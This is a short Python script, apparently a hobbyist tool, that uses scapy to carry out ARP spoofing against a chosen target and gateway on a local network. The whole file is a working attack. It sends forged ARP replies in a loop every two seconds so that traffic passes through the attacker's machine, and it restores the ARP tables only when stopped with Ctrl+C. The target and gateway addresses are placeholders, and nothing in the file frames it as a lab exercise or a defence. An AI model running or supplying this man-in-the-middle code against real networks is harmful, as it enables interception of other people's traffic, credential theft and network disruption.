import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_Mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_Mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(dest_ip,src_ip):
    dest_mac=get_mac(dest_ip)
    src_mac=get_mac(src_ip)
    packet=scapy.ARP(op=2,pdst=dest_ip,hwdst=dest_mac,psrc=src_ip,hwsrc=src_mac)
    scapy.send(packet,count=4,verbose=False)


Packet_count=0
target_ip="Enter The Traget_IP"
gateway_ip="Enter The Gateway_IP"
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        Packet_count = Packet_count + 2
        print("\r[+] pakcets send: " + str (Packet_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except  KeyboardInterrupt:
    print("[+] ctrl+c for quitting.............",end="")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

